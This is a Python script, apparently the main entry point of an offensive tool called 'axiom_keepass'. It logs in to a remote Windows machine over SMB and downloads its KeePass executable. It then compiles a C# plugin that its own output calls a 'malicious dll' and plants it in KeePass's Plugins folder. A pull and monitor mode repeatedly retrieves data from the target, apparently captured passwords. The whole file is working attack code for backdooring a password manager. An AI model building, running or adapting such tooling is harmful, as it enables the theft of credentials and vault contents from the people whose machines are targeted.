#!/usr/bin/python3

import os
import sys
import time
import subprocess
import tempfile

from axiom_keepass.core.parse_args import AxiomArgParser
from axiom_keepass.client.login import login
from axiom_keepass.client.download import download
from axiom_keepass.client.upload import upload
from axiom_keepass.client.pull import pull

def main():
    parser = AxiomArgParser()
    parser.Parse()
    args = parser.Validate()
    tmp_dir = tempfile.TemporaryDirectory().name
    os.mkdir(tmp_dir)
    print(f"[+] Using tmp dir {tmp_dir}")

    smbClient = login(args)
    print("[+] Successful login")

    if AxiomArgParser.GetProgramArgs().pull == True:
        print("[+] Running in pull mode")
        pull(smbClient)
        sys.exit(0)

    if AxiomArgParser.GetProgramArgs().monitor == True:
        while True:
            pull(smbClient, silent=True)
            time.sleep(AxiomArgParser.GetProgramArgs().monitor_delay)

    download(
        smbClient,
        r"\Program Files\KeePass Password Safe 2\KeePass.exe",
        f"{tmp_dir}/KeePass.exe"
    )

    subprocess.run([
        "mcs",
        "-platform:x64",
        f"-out:{tmp_dir}/AxiomKeepass.dll",
        f"-r:{tmp_dir}/KeePass.exe",
        f"-r:{os.path.dirname(__file__)}/../Binaries/System.Windows.Forms.dll",
        "-target:library",
        f"{os.path.dirname(__file__)}/../Assembly/AxiomKeepass.cs",
        f"{os.path.dirname(__file__)}/../Assembly/AssemblyInfo.cs"
    ])
    print("[+] Malicious dll compiled")

    upload(
        smbClient,
        r"\Program Files\KeePass Password Safe 2\Plugins\AxiomKeepass.dll",
        f"{tmp_dir}/AxiomKeepass.dll"
    )

if __name__ == "__main__":
    main()

